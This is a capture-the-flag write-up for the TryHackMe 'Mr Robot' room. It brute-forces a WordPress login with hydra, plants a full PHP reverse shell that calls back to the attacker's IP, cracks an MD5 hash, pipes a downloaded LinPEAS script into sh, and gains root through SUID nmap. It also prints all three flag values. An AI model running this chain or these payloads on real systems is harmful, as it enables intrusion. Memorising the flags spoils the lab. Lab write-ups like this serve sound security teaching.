---
layout: post
title: THM Mr Robot CTF
tags: [THM, CTF, Privilege Escalation, Wordpress]
date: 2023-09-16 15:42:39
toc:
    sidebar: left
    toc-depth: 3
---

# THM Mr Robot CTF 

## Task 1 - Connect to our Network

To begin with, just connect to the network using the OpenVPN file provided in the access room.

## Task 2 - Hack the machine

Firstly, I need to know more about the machine we want to access.
To do that, we'll be making a nmap scan to know if ports are opened.

``` sh
sudo nmap -sV -O 10.10.25.198
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-16 09:59 EDT
Nmap scan report for 10.10.25.198
Host is up (0.029s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
Device type: general purpose|specialized|storage-misc|broadband router|WAP|printer
Running (JUST GUESSING): Linux 5.X|3.X|4.X|2.6.X (89%), Crestron 2-Series (87%), HP embedded (87%), Asus embedded (86%)
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 5.4 (89%), Linux 3.10 - 3.13 (88%), Linux 3.10 - 4.11 (88%), Linux 3.12 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.5 (88%), Linux 3.2 - 3.8 (88%), Linux 4.2 (88%), Linux 4.4 (88%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.15 seconds
```

It shows that the ports 22 (ssh), 80 (http) and 443 (https) are currently running.
We'll verify if a vulnerable website is running.

When access to the website, we are welcomed with a Mr Robot themed website with some commands to trigger actions.

![fsociety website](/assets/img/images/thm_mr_robot_ctf_writeup/rydXD4X1T.png)

After some surfing with prepare command or fsociety, we continue using join.
We are asked to put my email address, so we use a temporary mail if we receive something important.

![mail asking](/assets/img/images/thm_mr_robot_ctf_writeup/SysnE_4kT.png)

After some time, nothing has been sent so we continue digging by looking at the html source code.

![fsociety website source code](/assets/img/images/thm_mr_robot_ctf_writeup/Syk1_uVyT.png)

There's nothing interesting so we fuzz the website to know if there any hidden webpage using

``` bash
ffuf -w /usr/share/seclists/Fuzzing.fuzz-Bo0om.txt -u http://10.10.150.113/FUZZ -mc 200

┌──(kali㉿kali)-[/usr/share/seclists/Fuzzing]
└─$ ffuf -w fuzz-Bo0oM.txt -u http://10.10.150.113/FUZZ -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.150.113/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 31ms]
    * FUZZ: admin/

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 31ms]
    * FUZZ: admin/index

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 32ms]
    * FUZZ: admin/index.html

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 30ms]
    * FUZZ: index.html

[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 29ms]
    * FUZZ: license

[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 29ms]
    * FUZZ: license.txt

[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 30ms]
    * FUZZ: readme

[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 29ms]
    * FUZZ: readme.html

[Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 29ms]
    * FUZZ: robots.txt

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 754ms]
    * FUZZ: wp-config.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 709ms]
    * FUZZ: wp-content/

[Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 743ms]
    * FUZZ: wp-login/

[Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 748ms]
    * FUZZ: wp-login.php

:: Progress: [4842/4842] :: Job [1/1] :: 49 req/sec :: Duration: [0:01:43] :: Errors: 0 ::

```

We can see there is a robots.txt available so we check it.

``` txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

With this clue, we try to go to the URL:
After pressing enter, the flag n°1 for this CTF is given:

*Key 1: `073403c8a58a1f80d943455fb30724b9`*

Then, we try to go to the URL https://10.10.150.113/fsocity.dic.
When that is done, the browser downloaded the associated file.

``` bash
head fsocity.dic
true
false
wikia
from
the
now
Wikia
extensions
scss
window

```

The file is really long and looks like a password list.
With ffuf, we found we can access to a wordpress login (https://10.10.150.113/wp-login.php) so we maybe have to bruteforce to access it.

![WP Panel login](/assets/img/images/thm_mr_robot_ctf_writeup/HJeufYVk6.png)

With the username Elliot, the error message sent by wp is different (the username admin doesn't work):
i.e, if the username doesn't exist, it returns *"Invalid username"* but if it's exinsting, it returns *"The password you entered for the username **USER** is incorrect"*.

![Login Incorrect](/assets/img/images/thm_mr_robot_ctf_writeup/r1WRHK4Jp.png)

Using hydra, we can retrieve the right password associated with the username Elliot.

``` sh
hydra -l Elliot -P fsocity.dic  http://10.10.150.113 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^:F=The password you entered for the username Elliot is incorrect."
```

After obtaining the combo `Elliot:ER28-0652`, we connect to the wp pannel.

![Dashboard](/assets/img/images/thm_mr_robot_ctf_writeup/H1YjDtNkT.png)

With the access, we can obtain a reverse shell by modifying the site with the *Editor* section in *Appearance*.
Then, we modify the archive.php to put the following code:

``` php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.11.24.118';
$port = 6870;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

![Theme edit](/assets/img/images/thm_mr_robot_ctf_writeup/H1eDtFEya.png)

We put a nc listener with the port 6870

``` bash
nc -lnvp 6870
```

We can access to the archive.php with the URL https://10.10.150.113/wp-content/themes/twentyfifteen/archive.php so we can get the reverse shell:

``` bash
nc -lnvp 6870        
listening on [any] 6870 ...
connect to [10.11.24.118] from (UNKNOWN) [10.10.150.113] 60344
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 14:18:12 up  2:05,  0 users,  load average: 5.94, 5.60, 4.80
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ ls /home
robot
$ ls /home/robot
key-2-of-3.txt
password.raw-md5
$ cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied

```

We can't read to the key-2-of-3.txt so we need to do a privesc to get the access to the user `robot`.
However, we can try to bruteforce the hashed md5 password with john the ripper or just use some online db if it already been cracket like https://crackstation.net.

``` sh
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

After that, we found that the password is:

|               Hash               | Type |           Result           |
|:--------------------------------:|:----:|:--------------------------:|
| c3fcd3d76192e4007dfb496cca67e13b | md5  | abcdefghijklmnopqrstuvwxyz |

With it, we reconnect to the revshell and we spawn a new tty with python command:

``` sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

If we don't do this, when we would want to do su, the command will say that there is no tty.

``` bash
su robot
password: 
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

*Key 2: `822c73956184f694993bede3eb39f959`*

After that, we'll look for another vulnerabilities present on the machine.
To do that simply, we'll upload LinPeas with python `http.server`.

Kali:

``` sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
sudo python3 -m http.server 8000 #Host
```

Victim:

``` sh
curl 10.10.145.120:8000/linpeas.sh > /tmp/linpeas.sh #Victim
chmod 777 /tmp/linpeas.sh
/tmp/linpeas.sh
```

After execution, we can see that nmap is a vector of PrivEsc because it has SUID with root permissions on it.
After cheecking on https://gtfobins.github.io/gtfobins/nmap/, we will use the interactive mode exploit.

Victim

``` sh
nmap --interactive
!sh
# whoami
root
" find -name "key-3-of-3"
/root/key-3-of-3.txt
# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

*Key 3: `04787ddef27c3dee1ee161b21670b4e4`*
